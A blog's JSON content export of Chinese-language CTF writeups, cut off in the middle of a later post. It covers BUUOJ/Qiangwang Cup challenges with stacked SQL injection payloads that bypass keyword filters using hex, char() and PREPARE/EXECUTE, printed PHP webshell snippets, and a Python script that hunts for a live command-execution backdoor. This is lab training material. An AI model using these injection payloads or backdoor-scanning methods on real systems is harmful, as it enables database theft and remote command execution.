&#125;</span><br><span class=\"line\">    <span class=\"comment\"># SIGTERM to writer</span></span><br><span class=\"line\">    <span class=\"keyword\">kill</span>(<span class=\"string\">&quot;TERM&quot;</span>, $writepid);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\"># copy standard input to the socket</span></span><br><span class=\"line\">    <span class=\"keyword\">my</span> $buffer;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"keyword\">sysread</span>(STDIN, $buffer, <span class=\"number\">1</span>))&#123;</span><br><span class=\"line\">\t$connection-&gt;<span class=\"keyword\">write</span>($buffer);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># close socket interface</span></span><br><span class=\"line\"><span class=\"keyword\">close</span>($socket);</span><br><span class=\"line\"><span class=\"keyword\">exit</span> <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure></p>\r\n\n    <div id=\"aplayer-XuZrpBzR\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"16846091\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{1fac1f87-62e0-44b7-9469-0f0fa01ea549}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP","Web","BUUOJ","FFI"]},{"title":"BUUOJ刷题-Web-随便注","url":"/2019/08/27/BUUOJ%E5%88%B7%E9%A2%98-Web-%E9%9A%8F%E4%BE%BF%E6%B3%A8/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>2019强网杯的随便注。</p>\r\n<p>提交<code>1</code>，返回 <figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">array(2) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(1) &quot;1&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(7) &quot;hahahah&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> <a id=\"more\"></a> 看起来使用了print_r()把返回的数组直接打印了出来。 提交<code>1'</code>，返回<code>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1</code>，MySQL数据库了。同时猜一下SQL语句是<code>select ''$_GET['inject']'' from XX</code>。</p>\r\n<p>提交<code>1'--+</code>，把<code>--+</code>过滤了。同样的，提交<code>1'#</code>，正常返回。 提交<code>1' union select 1,2,3%23</code>，发现返回<code>return preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);</code>。常见关键字过滤了。</p>\r\n<p>提交<code>1' or '1'='1</code>，发现把表里的数据都返回了，<code>or</code>没有被过滤。</p>\r\n<p>那么，提交<code>1' order by 1#</code>，页面正常，提交<code>1' order by 2#</code>，页面正常，提交<code>1' order by 3#</code>，返回<code>error 1054 : Unknown column '3' in 'order clause'</code>，那么这张表里只有两个字段。</p>\r\n<p>然后就涉及到新的知识点<a href=\"https://www.cnblogs.com/0nth3way/articles/7128189.html\">堆叠注入</a>。简单地讲，就是MySQL允许将多个SQL语句放在一个查询里提交。我们试一下<code>1'show databases;#</code>，返回</p>\r\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">array(2) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(1) &quot;1&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(7) &quot;hahahah&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">array(1) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(11) &quot;ctftraining&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">array(1) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(18) &quot;information_schema&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">array(1) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(5) &quot;mysql&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">array(1) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(18) &quot;performance_schema&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">array(1) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(9) &quot;supersqli&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">array(1) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(4) &quot;test&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>看来可以。</p>\r\n<p>那么下一步要拿到当前数据库的信息。提交<code>1';show tables;#</code>，返回</p>\r\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">array(2) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(1) &quot;1&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(7) &quot;hahahah&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">array(1) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(16) &quot;1919810931114514&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">array(1) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(5) &quot;words&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>1919810931114514表看起来很有意思。下一步获得列名。提交<code>1';show columns from \\</code>1919810931114514`;`，返回</p>\r\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">array(2) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(1) &quot;1&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(7) &quot;hahahah&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">array(6) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(4) &quot;flag&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(12) &quot;varchar(100)&quot;</span><br><span class=\"line\">  [2]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;NO&quot;</span><br><span class=\"line\">  [3]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">  [4]&#x3D;&gt;</span><br><span class=\"line\">  NULL</span><br><span class=\"line\">  [5]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>flag看来就在1919810931114514表里，但是我们现在需要跨表查询，且不能出现select。两种思路：一种是替换表。我们无法手动查询其他的表，但我们可以将要查询的表改名成当前的表，这样正常访问网页的时候就会带出来我们想要的数据。二是利用MySQL的PREPARE和EXECUTE，任意执行SQL语句。但由于某些关键字的过滤，因此SQL语句需要进行一些处理。</p>\r\n<h1 id=\"替换表\">替换表</h1>\r\n<p>通过show columns可以看到words和1919810931114514表的结构。words表的结构为：</p>\r\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">array(2) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(1) &quot;1&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(7) &quot;hahahah&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">array(6) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;id&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(7) &quot;int(10)&quot;</span><br><span class=\"line\">  [2]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;NO&quot;</span><br><span class=\"line\">  [3]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">  [4]&#x3D;&gt;</span><br><span class=\"line\">  NULL</span><br><span class=\"line\">  [5]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">array(6) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(4) &quot;data&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(11) &quot;varchar(20)&quot;</span><br><span class=\"line\">  [2]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;NO&quot;</span><br><span class=\"line\">  [3]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">  [4]&#x3D;&gt;</span><br><span class=\"line\">  NULL</span><br><span class=\"line\">  [5]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>那么我们要做的事情如下：</p>\r\n<ol type=\"1\">\r\n<li>将words表换成其他名字，将1919810931114514表换成words。</li>\r\n<li>将现在的words表的flag字段改为data，再加一个id字段。</li>\r\n</ol>\r\n<p>因此payload为：1';RENAME TABLE <code>words</code> TO <code>words1</code>;RENAME TABLE <code>1919810931114514</code> TO <code>words</code>;ALTER TABLE <code>words</code> CHANGE <code>flag</code> <code>id</code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#。</p>\r\n<p>然后访问<code>1' or '1'='1</code>，因为我们没有给id赋值，正常查询会失败。</p>\r\n<h1 id=\"execute\">EXECUTE</h1>\r\n<p>或者，我们直接使用Execute执行存储过程。我们原本要执行的SQL语句是select * from <code>1919810931114514</code> ，但是由于不能出现select，我们使用char和concat函数绕过。即将上述SQL语句变成：</p>\r\n<p>concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(42),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96),char(32))</p>\r\n<p>因此我们提交：1';set <span class=\"citation\" data-cites=\"xx\">@xx</span>=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(42),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96),char(32));prepare abc from <span class=\"citation\" data-cites=\"xx\">@xx</span>;execute abc;#</p>\r\n<p>然后返回了个<code>strstr($inject, \"set\") &amp;&amp; strstr($inject, \"prepare\")</code>，但是随便改一下大小写就好了。</p>\r\n<p>或者不用concat和char，直接把SQL语句16进制编码，即1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from <span class=\"citation\" data-cites=\"a\">@a</span>;execute execsql;#</p>\r\n\n    <div id=\"aplayer-OOubGXbi\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"584155\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{0a40da1f-849a-4110-bef2-2902426228d2}</p>\r\n","categories":["Writeups"],"tags":["Web","BUUOJ","SQL注入","堆叠注入"]},{"title":"BUUOJ刷题-Web-高明的黑客","url":"/2019/08/30/BUUOJ%E5%88%B7%E9%A2%98-Web-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>2019强网杯高明的黑客。</p>\r\n<p>打开页面，写得很明白。<code>www.tar.gz</code>下载后发现有3001个PHP文件。每个PHP文件都有类似的代码段，看起来像是个自动代码生成的产物。</p>\r\n<p>结构有如下几种： <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$_GET[<span class=\"string\">&#x27;jVMcNhK_F&#x27;</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">system($_GET[<span class=\"string\">&#x27;jVMcNhK_F&#x27;</span>] ?? <span class=\"string\">&#x27; &#x27;</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$_GET[<span class=\"string\">&#x27;tz2aE_IWb&#x27;</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> \\`&#123;$_GET[<span class=\"string\">&#x27;tz2aE_IWb&#x27;</span>]&#125;\\`;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$_GET[<span class=\"string\">&#x27;cXjHClMPs&#x27;</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> \\`&#123;$_GET[<span class=\"string\">&#x27;cXjHClMPs&#x27;</span>]&#125;\\`;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ZwXq7h4</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $kg = <span class=\"string\">&#x27;eTgcwk&#x27;</span>;</span><br><span class=\"line\">    $tWpHGUieX = <span class=\"string\">&#x27;BL02r6&#x27;</span>;</span><br><span class=\"line\">    $eGPiYwW9IX3 = <span class=\"string\">&#x27;d0agCqWE&#x27;</span>;</span><br><span class=\"line\">    $YRGLSyUMNnN = <span class=\"keyword\">new</span> <span class=\"built_in\">stdClass</span>();</span><br><span class=\"line\">    $YRGLSyUMNnN-&gt;IfsR = <span class=\"string\">&#x27;tpt7Y_H&#x27;</span>;</span><br><span class=\"line\">    $YRGLSyUMNnN-&gt;aLX6ZxLYjJ = <span class=\"string\">&#x27;QlHS60c&#x27;</span>;</span><br><span class=\"line\">    $kg = $_POST[<span class=\"string\">&#x27;i84HFoocE21gs&#x27;</span>] ?? <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">    $tWpHGUieX = explode(<span class=\"string\">&#x27;Q7iPB9MuttH&#x27;</span>, $tWpHGUieX);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"string\">&#x27;cg6BNgitU&#x27;</span> == <span class=\"string\">&#x27;RGcyY1oQX&#x27;</span>)</span><br><span class=\"line\">    system($_GET[<span class=\"string\">&#x27;cg6BNgitU&#x27;</span>] ?? <span class=\"string\">&#x27; &#x27;</span>);</span><br><span class=\"line\">    $_GET[<span class=\"string\">&#x27;ganVMUq3d&#x27;</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">eval</span>($_GET[<span class=\"string\">&#x27;ganVMUq3d&#x27;</span>] ?? <span class=\"string\">&#x27; &#x27;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ZwXq7h4();</span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$wr2t = <span class=\"string\">&#x27;Qhh4_apLRLY&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$wr2t = $_POST[<span class=\"string\">&#x27;K3Udo9aauO&#x27;</span>] ?? <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>整体来讲，代码类似于命令执行的后门，但是都被提前置空了，因而无法触发。猜测某个文件下有参数没有置空，因此能够执行命令。那么我们的思路就是暴力扫描所有的GET和POST参数，测试命令为'echo qwertyuiop'，如果在返回页面中出现了这个字符串，那么就意味着命令执行成功了。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> multiprocessing</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/src/&quot;</span></span><br><span class=\"line\">counts = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">process</span>(<span class=\"params\">url, file, method, parameter</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> method == <span class=\"string\">&quot;get&quot;</span>:</span><br><span class=\"line\">        a = requests.get(<span class=\"string\">&quot;&#123;0&#125;/&#123;1&#125;?&#123;2&#125;=echo &#x27;qwertyuiop&#x27;&quot;</span>.format(url, file, parameter))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;qwertyuiop&quot;</span> <span class=\"keyword\">in</span> a.text:</span><br><span class=\"line\">            print(<span class=\"string\">&quot;[!]Found parameter in &#123;0&#125;.Method is &#123;1&#125;.Parameter is &#123;2&#125;.&quot;</span>.format(file, method, parameter))</span><br><span class=\"line\">            exit()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> method == <span class=\"string\">&quot;post&quot;</span>:</span><br><span class=\"line\">        data = dict()</span><br><span class=\"line\">        data[parameter] = <span class=\"string\">&quot;echo &#x27;qwertyuiop&#x27;&quot;</span></span><br><span class=\"line\">        a = requests.post(<span class=\"string\">&quot;&#123;0&#125;/&#123;1&#125;&quot;</span>.format(url, file), data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;qwertyuiop&quot;</span> <span class=\"keyword\">in</span> a.text:</span><br><span class=\"line\">            print(<span class=\"string\">&quot;[!]Found parameter in &#123;0&#125;.Method is &#123;1&#125;.Parameter is &#123;2&#125;.&quot;</span>.format(file, method, parameter))</span><br><span class=\"line\">            exit()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">read_file</span>(<span class=\"params\">single_file</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> counts</span><br><span class=\"line\">    counts += <span class=\"number\">1</span></span><br><span class=\"line\">    print(<span class=\"string\">&quot;[+]Processing file:&#123;0&#125;&quot;</span>.format(single_file))</span><br><span class=\"line\">    lines = open(single_file).readlines()</span><br><span class=\"line\">    get_pattern = <span class=\"string\">r&quot;\\$_GET\\[\\S+\\]&quot;</span></span><br><span class=\"line\">    post_pattern = <span class=\"string\">r&quot;\\$_POST\\[\\S+\\]&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> lines:</span><br><span class=\"line\">        get_obj = re.search(get_pattern, line)</span><br><span class=\"line\">        post_obj = re.search(post_pattern, line)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> get_obj:</span><br><span class=\"line\">            print(<span class=\"string\">&quot;[+]Found get parameter:&#123;0&#125;&quot;</span>.format(get_obj.group()))</span><br><span class=\"line\">            parameter = get_obj.group()[<span class=\"number\">7</span>:<span class=\"number\">-2</span>]</span><br><span class=\"line\">            process(url=url, method=<span class=\"string\">&quot;get&quot;</span>, parameter=parameter, file=single_file)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> post_obj:</span><br><span class=\"line\">            print(<span class=\"string\">&quot;[+]Found post parameter:&#123;0&#125;&quot;</span>.format(post_obj.group()))</span><br><span class=\"line\">            parameter = post_obj.group()[<span class=\"number\">8</span>:<span class=\"number\">-2</span>]</span><br><span class=\"line\">            process(url=url, file=single_file, method=<span class=\"string\">&quot;post&quot;</span>, parameter=parameter)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    dir = <span class=\"string\">&quot;D:\\\\Onedrive\\\\desktop\\\\src&quot;</span></span><br><span class=\"line\">    os.chdir(dir)</span><br><span class=\"line\">    result_file = os.listdir(dir)</span><br><span class=\"line\">    p = multiprocessing.Pool(<span class=\"number\">30</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, <span class=\"number\">100</span>):</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">0</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">1</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">2</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">3</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">4</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">5</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">6</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">7</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">8</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">9</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">10</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">11</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">12</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">13</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">14</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">15</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">16</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">17</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">18</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">19</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">20</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">21</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">22</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">23</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">24</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">25</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">26</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">27</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">28</span>],))</span><br><span class=\"line\">        p.apply_async(func=read_file, args=(result_file[a * <span class=\"number\">30</span> + <span class=\"number\">29</span>],))</span><br><span class=\"line\"></span><br><span class=\"line\">    p.close()</span><br><span class=\"line\">    p.join()</span><br><span class=\"line\">    read_file(result_file[<span class=\"number\">-1</span>])</span><br><span class=\"line\">    print(counts)</span><br></pre></td></tr></table></figure>\r\n<p>最后果然跑出来了，xk0SzyKwfzw.php，GET Efa5BVG，那么直接cat /flag即可。</p>\r\n\n    <div id=\"aplayer-GVFGmwKS\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"509313159\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{ac2b73b9-08fa-4525-8073-fc95b0c7f905}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","BUUOJ"]},{"title":"Balsn-CTF-2019-Image-and-words","url":"/2020/02/06/Balsn-CTF-2019-Image-and-words/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>Balsn CTF 2019的Image and words，当时0解。</p>\r\n<p>给了个Zip文件，里面有完整的环境。先看一下run.sh：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gunicorn \\</span><br><span class=\"line\">  --<span class=\"built_in\">bind</span> <span class=\"string\">&quot;<span class=\"variable\">$default_bind</span>&quot;</span> \\</span><br><span class=\"line\">  --worker-class uvicorn.workers.UvicornWorker \\</span><br><span class=\"line\">  --workers 1 \\</span><br><span class=\"line\">  --<span class=\"built_in\">umask</span> 007 \\</span><br><span class=\"line\">  main:server</span><br></pre></td></tr></table></figure>\r\n<p>gunicorn起的服务，只允许一个工作线程？有点意思，还不知道什么用。 main.py是主服务了： <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pathlib <span class=\"keyword\">import</span> Path</span><br><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> secrets</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> starlette.applications <span class=\"keyword\">import</span> Starlette</span><br><span class=\"line\"><span class=\"keyword\">from</span> starlette.responses <span class=\"keyword\">import</span> HTMLResponse</span><br><span class=\"line\"><span class=\"keyword\">from</span> starlette.background <span class=\"keyword\">import</span> BackgroundTask</span><br><span class=\"line\"><span class=\"keyword\">from</span> starlette.staticfiles <span class=\"keyword\">import</span> StaticFiles</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> config</span><br><span class=\"line\"><span class=\"keyword\">import</span> text2image</span><br><span class=\"line\"></span><br><span class=\"line\">DEFAULT_RESPONSE = HTMLResponse(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&lt;h1&gt;Images and Words&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"string\">Convert text to a png file!</span></span><br><span class=\"line\"><span class=\"string\">&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;input type=&quot;submit&quot; value=&quot;Upload text&quot; name=&quot;submit&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">server = Starlette(debug=config.DEBUG)</span><br><span class=\"line\">config.UPLOAD_DIR.mkdir(mode=<span class=\"number\">0o700</span>, exist_ok=<span class=\"literal\">True</span>)</span><br><span class=\"line\">server.mount(<span class=\"string\">&#x27;/static&#x27;</span>, app=StaticFiles(directory=str(config.UPLOAD_DIR)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span 